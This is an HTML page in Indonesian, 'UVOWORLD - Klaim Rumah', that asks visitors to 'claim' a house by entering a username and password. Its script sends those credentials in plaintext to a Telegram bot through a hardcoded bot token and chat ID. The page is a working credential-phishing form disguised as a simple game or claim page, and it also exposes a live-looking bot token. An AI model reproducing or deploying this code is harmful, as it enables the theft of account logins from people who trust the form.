<!DOCTYPE html>
<html>
<head>
  <title>UVOWORLD - Klaim Rumah</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      background: #f9f9f9;
    }
    h1 {
      margin-top: 30px;
    }
    .jalan {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 12px;
      margin-top: 40px;
    }
    .rumah {
      width: 100px;
      height: 100px;
      background: #cce;
      border: 2px solid #444;
      border-radius: 8px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 2px 2px 5px rgba(0,0,0,0.2);
    }
    #formBox {
      display: none;
      margin-top: 20px;
    }
    input {
      padding: 6px;
      margin: 5px;
      border-radius: 4px;
      border: 1px solid #aaa;
      width: 200px;
    }
    button {
      padding: 8px 16px;
      background: #3399ff;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #2277cc;
    }
  </style>
</head>
<body>

<h1>üè° UVOWORLD</h1>
<p>Klik salah satu rumah di jalan untuk klaim</p>

<div class="jalan" id="jalan"></div>

<div id="formBox">
  <h3 id="judulForm">Klaim Rumah</h3>
  <input id="username" placeholder="Username">
  <input id="password" type="password" placeholder="Password">
  <button onclick="kirim()">Klaim Sekarang</button>
</div>

<script>
  const botToken = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8"; // GANTI setelah tes!
  const chatId = "6501126879"; // Chat ID kamu (@uvostorecs)

  let rumahAktif = -1;

  function buatRumah() {
    const jalan = document.getElementById("jalan");
    jalan.innerHTML = "";
    for (let i = 1; i <= 10; i++) {
      const div = document.createElement("div");
      div.className = "rumah";
      div.innerText = `Rumah ${i}`;
      div.onclick = () => bukaForm(i);
      jalan.appendChild(div);
    }
  }

  function bukaForm(nomor) {
    rumahAktif = nomor;
    document.getElementById("formBox").style.display = "block";
    document.getElementById("judulForm").innerText = `Klaim Rumah ${nomor}`;
  }

  function kirim() {
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!user || !pass || rumahAktif === -1) {
      alert("Lengkapi semua kolom dulu!");
      return;
    }

    const pesan = `üè† *Klaim Rumah ${rumahAktif}*\nüë§ Username: *${user}*\nüîí Password: \`${pass}\``;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: pesan,
        parse_mode: "Markdown"
      })
    })
    .then(res => res.json())
    .then(data => {
      alert("‚úÖ Klaim berhasil dikirim ke bot!");
      document.getElementById("formBox").style.display = "none";
      document.getElementById("username").value = "";
      document.getElementById("password").value = "";
    })
    .catch(err => {
      alert("‚ùå Gagal kirim ke bot.");
      console.error(err);
    });
  }

  buatRumah();
</script>

</body>
</html>
